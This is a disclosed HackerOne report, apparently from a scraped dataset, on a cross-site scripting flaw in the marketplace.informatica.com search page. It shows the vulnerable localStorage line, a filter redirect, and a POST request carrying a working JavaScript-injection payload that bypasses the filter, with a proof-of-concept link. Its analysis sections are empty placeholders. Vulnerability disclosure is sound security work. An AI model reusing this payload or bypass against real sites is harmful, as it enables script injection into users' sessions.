---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '200034'
original_report_id: '200034'
title: '[marketplace.informatica.com] Search XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2017-01-20T21:00:43.260Z'
disclosed_at: '2017-05-22T04:08:23.983Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [marketplace.informatica.com] Search XSS

## Metadata

- HackerOne Report ID: 200034
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2017-05-22T04:08:23.983Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The search query parameter is put into Javascript to set the localStorage item:

https://marketplace.informatica.com/search-solr.jspa?q=%foo%

```javascript
localStorage.setItem("searchTerm", "%foo%");
```

Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:

```http
GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
Host: marketplace.informatica.com

HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
```

However it turns out the search param can be successfully submitted via POST — the following request popups an alert:

```http
POST /search-solr.jspa HTTP/1.1
Host: marketplace.informatica.com

q=%22-alert%28document.domain%29-%22
```

**PoC:**

http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9

Tested with latest Firefox and Chrome.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
